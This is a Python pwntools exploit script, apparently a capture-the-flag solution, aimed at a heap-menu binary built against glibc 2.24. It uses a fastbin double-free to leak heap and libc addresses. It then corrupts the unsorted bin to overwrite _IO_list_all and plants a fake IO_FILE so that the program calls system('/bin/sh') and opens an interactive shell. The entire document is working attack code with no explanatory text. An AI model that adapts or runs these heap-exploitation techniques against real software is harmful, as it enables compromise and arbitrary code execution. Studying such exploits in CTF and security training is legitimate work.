from pwn import*
def new(index,content):
	p.sendlineafter('choice:','1')
	p.sendlineafter('Index:',str(index))
	p.sendafter('Content:',content)
def show(index):
	p.sendlineafter('choice:','2')
	p.sendlineafter('Index:',str(index))
def free(index):
	p.sendlineafter('choice:','3')
	p.sendlineafter('Index:',str(index))
def modify(addr,data):
	free(3)
	free(4)
	free(3)
	new(3,p64(addr - 0x10))
	new(4,(p64(0)+p64(0x61)) *5)
	new(3,(p64(0)+p64(0x61)) *5)
	new(9,data)
p = process('./main')
libc =ELF('./libc-2.24.so',checksec=False)
for i in range(10):
	new(i,(p64(0)+p64(0x61)) *5)
free(0)
free(1)
free(0)
show(0)
heap_base = u64(p.recvuntil('Done!',drop=True).ljust(8,'\x00')) - 0x60
log.info('HEAP:\t' + hex(heap_base))
new(0,p64(heap_base + 0x50) + '\x00'*0x38 + p64(0) + p64(0x61))
new(1,'FMYY')
new(0,'FMYY')
new(0,p64(0) + p64(0xB1))
free(1)
show(1)
libc_base = u64(p.recv(6).ljust(8,'\x00')) -88 - libc.sym['__malloc_hook'] - 0x10
log.info('LIBC:\t' + hex(libc_base))
IO_list_all = libc_base + libc.sym['_IO_list_all']
system = libc_base + libc.sym['system']
IO_str_jumps = libc_base + 0x3BE4C0
unsorted_bins = libc_base + libc.sym['__malloc_hook'] + 0x10 + 88
binsh = libc_base+libc.search('/bin/sh').next()
modify(heap_base +0x240,p64(0)+p64(0xA1))
free(6)
new(6,'FMYY')


modify(heap_base+0x2A0,p64(0) + p64(0x61))
free(7)
new(7,p64(unsorted_bins) + p64(IO_list_all -0x10))
new(7,'FMYY')
fake_IO_FILE  = p64(0) + p64(0xB1) + p64(unsorted_bins) + p64(IO_list_all -0x10)#make the IO_list_all ->fd =main_arena+88
fake_IO_FILE += p64(0) + p64(1)
fake_IO_FILE += p64(0) + p64(binsh)
fake_IO_FILE = fake_IO_FILE.ljust(0xD8,'\x00')
fake_IO_FILE += p64(IO_str_jumps -8)
fake_IO_FILE += p64(0) + p64(system)
modify(heap_base +0x60,fake_IO_FILE[0:0x50])
modify(heap_base +0x60 + 0x50 + 0x50,fake_IO_FILE[0xA0:])
p.sendlineafter('choice:','1')
p.sendlineafter('Index:',str(0))
p.interactive()
	
